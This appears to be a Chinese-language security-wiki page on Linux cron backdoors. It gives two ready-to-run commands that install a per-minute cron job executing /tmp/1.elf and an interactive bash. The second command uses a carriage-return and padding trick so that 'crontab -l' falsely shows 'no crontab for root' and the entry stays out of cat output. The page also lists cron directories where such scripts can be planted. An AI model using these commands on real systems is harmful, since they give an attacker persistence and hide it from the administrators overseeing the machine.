# Cron后门

**Cron介绍**

在Linux系统中，计划任务一般是由cron承担，我们可以把cron设置为开机时自动启动。cron启动后，它会读取它的所有配置文件（全局性配置文件/etc/crontab，以及每个用户的计划任务配置文件），然后cron会根据命令和执行时间来按时来调用工作任务。

**Cron后门**

> cron表达式在线生成：

http://qqe2.com/cron

```bash
(crontab -l;echo '*/1 * * * * /bin/bash /tmp/1.elf;/bin/bash --noprofile -i')|crontab -

```

![](images/security_wiki/15905489549679.png)


这样执行会在crontab列表里出现，如果是如上执行的话，管理员执行crontab -l就能看到执行的命令内容不是特别隐蔽。

那么就有了一个相对的高级用法，下面命令执行后会显示”no crontab for root”。其实就达到了一个隐藏的效果，这时候管理员如果执行crontab -l就会看到显示”no crontab for root”。

```bash
(crontab -l;printf "*/1 * * * * /bin/bash /tmp/1.elf;/bin/bash --noprofile -i;\rno crontab for `whoami`%100c\n")|crontab -

```

![](images/security_wiki/15905489620860.png)


实际上是他将cron文件写到文件中。/var/spool/cron/crontabs/root 。而crontab -l就是列出了该文件的内容。

通常cat是看不到这个的，只能利用less或者vim看到，这也是利用了cat的一个缺陷，后面会讲到。

![](images/security_wiki/15905489692429.png)


/etc/cron.d/ /etc/cron.daily/ /etc/cron.weekly/ /etc/cron.hourly/ /etc/cron.monthly/ 这几个路径都可以存放cron执行脚本,对应的时间不同。

